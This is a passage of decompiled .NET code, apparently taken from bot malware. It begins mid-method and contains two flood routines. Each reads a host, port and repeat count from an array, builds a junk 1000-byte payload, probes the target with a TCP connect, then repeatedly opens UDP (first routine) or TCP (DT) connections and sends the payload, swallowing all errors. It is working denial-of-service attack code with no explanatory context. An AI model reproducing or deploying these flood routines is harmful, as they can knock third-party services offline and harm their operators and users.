		Encoding aSCII = Encoding.ASCII;
		int y = 1000;
		array = aSCII.GetBytes(_P(ref y));
		try
		{
			TcpClient tcpClient = new TcpClient();
			Socket client = tcpClient.Client;
			object[] array2 = new object[2];
			object[] array3 = array2;
			object[] array4 = new object[1];
			object[] array5 = array4;
			y = 0;
			array5[0] = 0;
			array3[0] = RuntimeHelpers.GetObjectValue(NewLateBinding.LateIndexGet((object)z, array4, (string[])null));
			object[] array6 = array2;
			object[] array7 = new object[1];
			object[] array8 = array7;
			int num = 1;
			array8[0] = 1;
			array6[1] = RuntimeHelpers.GetObjectValue(NewLateBinding.LateIndexGet((object)z, array7, (string[])null));
			object[] array9 = array2;
			object[] array10 = array9;
			bool[] array11 = new bool[2] { true, true };
			NewLateBinding.LateCall((object)client, (Type)null, "Connect", array10, (string[])null, (Type[])null, array11, true);
			if (array11[0])
			{
				NewLateBinding.LateIndexSetComplex((object)z, new object[2]
				{
					y,
					RuntimeHelpers.GetObjectValue(array9[0])
				}, (string[])null, true, false);
			}
			if (array11[1])
			{
				NewLateBinding.LateIndexSetComplex((object)z, new object[2]
				{
					num,
					RuntimeHelpers.GetObjectValue(array9[1])
				}, (string[])null, true, false);
			}
			tcpClient.Close();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
			return;
		}
		int num2 = Conversions.ToInteger(NewLateBinding.LateIndexGet((object)z, new object[1] { 2 }, (string[])null));
		for (int i = 0; i <= num2; i++)
		{
			UdpClient udpClient = new UdpClient();
			try
			{
				object[] array9 = new object[2];
				object[] array12 = array9;
				object[] array13 = new object[1];
				object[] array14 = array13;
				int num = 0;
				array14[0] = 0;
				array12[0] = RuntimeHelpers.GetObjectValue(NewLateBinding.LateIndexGet((object)z, array13, (string[])null));
				object[] array15 = array9;
				object[] array16 = new object[1];
				object[] array17 = array16;
				y = 1;
				array17[0] = 1;
				array15[1] = RuntimeHelpers.GetObjectValue(NewLateBinding.LateIndexGet((object)z, array16, (string[])null));
				object[] array2 = array9;
				object[] array18 = array2;
				bool[] array11 = new bool[2] { true, true };
				NewLateBinding.LateCall((object)udpClient, (Type)null, "Connect", array18, (string[])null, (Type[])null, array11, true);
				if (array11[0])
				{
					NewLateBinding.LateIndexSetComplex((object)z, new object[2]
					{
						num,
						RuntimeHelpers.GetObjectValue(array2[0])
					}, (string[])null, true, false);
				}
				if (array11[1])
				{
					NewLateBinding.LateIndexSetComplex((object)z, new object[2]
					{
						y,
						RuntimeHelpers.GetObjectValue(array2[1])
					}, (string[])null, true, false);
				}
				udpClient.Client.SendTimeout = 500;
				udpClient.Client.Send(array, array.Length, SocketFlags.None);
			}
			catch (Exception projectError2)
			{
				ProjectData.SetProjectError(projectError2);
				ProjectData.ClearProjectError();
			}
		}
	}

	public static void DT(Array Z)
	{
		byte[] array = new byte[0];
		Encoding aSCII = Encoding.ASCII;
		int y = 1000;
		array = aSCII.GetBytes(_P(ref y));
		try
		{
			TcpClient tcpClient = new TcpClient();
			Socket client = tcpClient.Client;
			object[] array2 = new object[2];
			object[] array3 = array2;
			object[] array4 = new object[1];
			object[] array5 = array4;
			y = 0;
			array5[0] = 0;
			array3[0] = RuntimeHelpers.GetObjectValue(NewLateBinding.LateIndexGet((object)Z, array4, (string[])null));
			object[] array6 = array2;
			object[] array7 = new object[1];
			object[] array8 = array7;
			int num = 1;
			array8[0] = 1;
			array6[1] = RuntimeHelpers.GetObjectValue(NewLateBinding.LateIndexGet((object)Z, array7, (string[])null));
			object[] array9 = array2;
			object[] array10 = array9;
			bool[] array11 = new bool[2] { true, true };
			NewLateBinding.LateCall((object)client, (Type)null, "Connect", array10, (string[])null, (Type[])null, array11, true);
			if (array11[0])
			{
				NewLateBinding.LateIndexSetComplex((object)Z, new object[2]
				{
					y,
					RuntimeHelpers.GetObjectValue(array9[0])
				}, (string[])null, true, false);
			}
			if (array11[1])
			{
				NewLateBinding.LateIndexSetComplex((object)Z, new object[2]
				{
					num,
					RuntimeHelpers.GetObjectValue(array9[1])
				}, (string[])null, true, false);
			}
			tcpClient.Close();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
			return;
		}
		int num2 = Conversions.ToInteger(NewLateBinding.LateIndexGet((object)Z, new object[1] { 2 }, (string[])null));
		for (int i = 0; i <= num2; i++)
		{
			TcpClient tcpClient2 = new TcpClient();
			try
			{
				object[] array9 = new object[2];
				object[] array12 = array9;
				object[] array13 = new object[1];
				object[] array14 = array13;
				int num = 0;
				array14[0] = 0;
				array12[0] = RuntimeHelpers.GetObjectValue(NewLateBinding.LateIndexGet((object)Z, array13, (string[])null));
				object[] array15 = array9;
				object[] array16 = new object[1];
				object[] array17 = array16;
				y = 1;
				array17[0] = 1;
				array15[1] = RuntimeHelpers.GetObjectValue(NewLateBinding.LateIndexGet((object)Z, array16, (string[])null));
				object[] array2 = array9;
				object[] array18 = array2;
				bool[] array11 = new bool[2] { true, true };
				NewLateBinding.LateCall((object)tcpClient2, (Type)null, "Connect", array18, (string[])null, (Type[])null, array11, true);
				if (array11[0])
				{
					NewLateBinding.LateIndexSetComplex((object)Z, new object[2]
					{
						num,
						RuntimeHelpers.GetObjectValue(array2[0])
					}, (string[])null, true, false);
				}
				if (array11[1])
				{
					NewLateBinding.LateIndexSetComplex((object)Z, new object[2]
					{
						y,
						RuntimeHelpers.GetObjectValue(array2[1])
					}, (string[])null, true, false);
				}
				tcpClient2.Client.SendTimeout = 500;
				tcpClient2.Client.Send(array, array.Length, SocketFlags.None);
			}
			catch (Exception projectError2)
			{
				ProjectData.SetProjectError(projectError2);
				ProjectData.ClearProjectError();
			}
		}
	}
}
